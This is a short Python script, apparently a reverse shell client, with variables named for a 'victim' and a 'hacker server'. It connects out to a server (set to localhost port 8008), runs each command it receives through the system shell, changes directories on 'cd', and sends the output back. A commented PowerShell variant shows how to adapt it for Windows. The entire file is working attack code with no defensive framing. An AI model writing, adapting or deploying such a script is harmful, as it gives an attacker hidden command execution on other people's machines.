import socket
import subprocess
import os

IDENTIFIER = "<END_OF_COMMAND_RESULT>"

if __name__ == "__main__":
    victim_client_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

    hacker_server_IP = "127.0.0.1"
    hacker_server_port = 8008

    hacker_server_address = (hacker_server_IP,hacker_server_port)
    victim_client_socket.connect(hacker_server_address)
    try:
        while True:
            data = victim_client_socket.recv(1024)
            hacker_server_command = data.decode()
            if hacker_server_command == "":
                continue
            elif hacker_server_command == "stop":
                victim_client_socket.close()
                break
            elif hacker_server_command.startswith("cd"):
                path2move = hacker_server_command.strip("cd ")
                if os.path.exists(path2move):
                    os.chdir(path2move)
                else:
                    print("can't change directory to ", path2move)
                continue
            # in windows machine: subprocess.run(["powershell.exe, hacker_server_command], shell=True, capture_output=True)
            else:
                output = subprocess.run(hacker_server_command, shell=True, capture_output=True)
                if output.stderr.decode("utf-8") == "":
                    command_result = output.stdout.decode("utf-8")+IDENTIFIER
                    command_result = command_result.encode("utf-8")

                else : 
                    command_result = output.stderr
                
                victim_client_socket.sendall(command_result)
    except Exception:
        print("error!")
        victim_client_socket.close()